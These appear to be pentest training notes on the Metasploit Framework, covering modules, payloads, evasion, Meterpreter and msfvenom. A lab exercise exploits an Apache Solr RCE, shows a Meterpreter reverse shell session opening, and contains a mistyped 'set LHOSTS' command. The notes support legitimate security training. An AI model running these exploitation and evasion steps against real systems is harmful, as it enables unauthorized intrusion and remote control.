# 03 - Using Metasploit Framework

## Overview & History
- Metasploit started in 2003 (HD Moore) and quickly became essential for security researchers; acquired by Rapid7 in 2009.
- Two main products: Metasploit Framework (open-source) and Metasploit Pro (commercial, web UI, extra features).

## Metasploit Pro (summary)
- Commercial product with GUI and web interface (https://localhost:3790).
- Features: Task Chains, Social Engineering tools, Vulnerability Validation, Quick Start Wizards, Nexpose integration, Pro Console (CLI similar to msfconsole).
- Advanced capabilities: AV/IPS evasion, post-exploitation management, credential reuse, phishing campaigns, VPN pivoting, data tagging and reporting.

## Metasploit Framework (focus of this training)
- Open-source, flexible platform for discovering, testing, and exploiting vulnerabilities. Widely used by ethical hackers and researchers.
- Provides modules, exploits, payloads, and an extensible infrastructure for penetration testing.

## Key Terminology & Components
- Module: Independent components (exploits, auxiliary, post, payloads).
- Exploit: Code that leverages a vulnerability to deliver a payload.
- Payload: Code executed on successful exploitation (e.g., shells, meterpreter, add user).
- Auxiliary: Non-exploit modules (scanners, DoS, data collection, server support).
- Shellcode: Payload to execute commands on target.
- Meterpreter: Advanced in-memory payload offering an interactive shell and many post-exploitation features.
- Bind shell vs Reverse shell: Bind opens a listener on target; reverse connects back to attacker.

## msfconsole (CLI)
- Primary command-line interface for Framework usage. Start with `msfconsole` (use `-q` to suppress banners).
- Help: `help` shows commands for current mode; `info <module>` shows module details.

### Common msfconsole commands
- `search [options] <keywords>` — find modules.
- `use <module>` — select a module by number or path.
- `info` — detailed module info (module mode).
- `options` — view/set module options (required fields marked).
- `show` — list encoders, nops, exploits, payloads, aux modules, post modules, plugins.
- `set <option> <value>` / `get <option>` / `unset` — configure module options.
- `advanced` — advanced options for a module.
- `check` — test whether an exploit is likely to work (if supported).
- `exploit` / `run` — execute the module.
- `sessions` — list/manage active sessions; `background` or CTRL+Z to background a session.

## Example workflow (exploit selection & execution)
- `search type:exploit <keyword>` to find target-specific exploits (e.g., `supervisor`).
- `use exploit/linux/http/supervisor_xmlrpc_exec` to select an exploit; a payload may be auto‑configured (e.g., `linux/x64/meterpreter/reverse_tcp`).
- Configure RHOST(S) (target), LHOST (attacker), LPORT, and other module-specific options via `set`.
- `options` shows required fields; `check` can test exploit viability without running it; `exploit` runs the attack and may yield a session.

## Payloads
- Payloads are categorized into singles, stagers, and stages. Names reflect platform/arch/stage/stager (e.g., `windows/x64/meterpreter/reverse_tcp`).
- Singles: standalone actions (e.g., add user, run calc); can be used outside Metasploit.
- Stagers: small network bootstraps that fetch larger stages.
- Stages: full feature payloads delivered by stagers (e.g., meterpreter).
- `show payloads` lists available payloads.
- Generate payloads with `generate`, `pry`, `reload` commands (e.g., `generate -f python LHOST=127.0.0.1`).

## Post‑exploitation
- Post modules run after compromise to collect data, escalate privileges, pivot, or clean up.
- Typical flow: background meterpreter session, `use post/...`, set `SESSION` to the active session id, then `run`.

## Encoders & Nops
- Encoders: transform payload bytes to avoid bad characters and evade detection (`show encoders`, `set encoder <name>`).
- Nops: no-op sleds to improve exploit reliability; `show nops` lists options and `set NOP <module>` selects a nops module.

## Evasion
- Evasion modules help bypass AV/IDS (examples: AppLocker evasion via MSBuild). Use `show evasion` to list modules.
- Typical flow: `use evasion/...`, `set PAYLOAD ...`, configure LHOST/LPORT, then `run`.

## Meterpreter (in‑memory payload)
- Advanced, extensible in-memory payload using reflective DLL injection and TLS communication. Design goals: stealth, power, extensibility.
- Common uses: file system access, process management, network reconnaissance, webcam/microphone control, and privilege escalation.

### Common Meterpreter commands (examples)
- Session control: `background`, `sessions`, `exit`.
- File ops: `ls`, `cd`, `download`, `upload`, `edit`, `rm`.
- Network: `ifconfig`/`ipconfig`, `netstat`, `portfwd`, `route`.
- System: `ps`, `getuid`, `getpid`, `execute`, `shell`, `sysinfo`.
- Media: `webcam_list`, `webcam_snap`, `mic_start`, `play` (varies by platform).

## MSFvenom
- Combined payload generation/encoding tool (replacement for msfpayload+msfencode).
- Allows creating malware files and adapting them for different operating systems
- Usage: `msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <outfile>` (e.g., generate an exe with a meterpreter reverse shell).

## Practical notes & ethics
- Many Metasploit features (e.g., evasion, exploit modules) can be intrusive; always obtain authorization before scanning/exploiting systems.
- Use `check` where available to validate exploits non‑destructively before running them.

---
### Exercise

What is the Metasploit exploit module for the Remote Code Execution vulnerability due to an outdated version of the Apache Solr service?
First open `msfconsole` and then use the following command to search for the exploit module:
search solr
Then we have to identify the correct module from the search results.
```
 1   exploit/multi/http/solr_velocity_rce            2019-10-29       excellent  Yes    Apache Solr Remote Code Execution via Velocity Template
```

Then we select the module with:
```
    use exploit/multi/http/solr_velocity_rce

```
And we can view the module information with:

```
    info

  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  PASSWORD   SolrRocks        no        Solr password
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
  RPORT      8983             yes       The target port (TCP)
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
  TARGETURI  /solr/           no        Path to Solr
  URIPATH                     no        The URI to use for this exploit (default is random)
  USERNAME   solr             no        Solr username
  VHOST                       no        HTTP server virtual host
```
The victims machine is `172.20.16.38` so we have to set the `RHOSTS` option with:
```
    set LHOSTS 172.20.16.38
```
```
msf6 exploit(multi/http/solr_velocity_rce) > exploit
[*] Started reverse TCP handler on 10.8.65.249:4444 
[*] 172.20.16.38:8983: Authentication not required
[*] Found Apache Solr 8.2.0
[*] OS version is Linux amd64 5.10.0-27-amd64
[*] Found core(s): novacollection
[+] Found Velocity Response Writer in use by core 'novacollection'
[!] params.resource.loader.enabled for core 'novacollection' is set to false.
[*] Targeting core 'novacollection'
[*] params.resource.loader.enabled is false for 'novacollection', trying to update it...
[+] params.resource.loader.enabled is true for core 'novacollection'
[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (10.8.65.249:8080).
[*] Exploit completed, but no session was created.
msf6 exploit(multi/http/solr_velocity_rce) > exploit
[*] Started reverse TCP handler on 10.8.65.249:4444 
[*] 172.20.16.38:8983: Authentication not required
[*] Found Apache Solr 8.2.0
[*] OS version is Linux amd64 5.10.0-27-amd64
[*] Found core(s): novacollection
[+] Found Velocity Response Writer in use by core 'novacollection'
[+] params.resource.loader.enabled for core 'novacollection' is set to true.
[*] Targeting core 'novacollection'
[+] params.resource.loader.enabled is true for core 'novacollection'
[*] Using URL: http://10.8.65.249:8080/9AQmIzCOHomPOFu/
[*] Sending stage (58073 bytes) to 172.20.16.38
[*] Meterpreter session 1 opened (10.8.65.249:4444 -> 172.20.16.38:51824) at 2025-10-25 11:17:02 +0100
[*] Server stopped.

meterpreter >
```
#### What is the username of the active user obtained from the shell on the target system?
From the meterpreter session, you can obtain the username of the active user on the target system by using the `getuid` command.
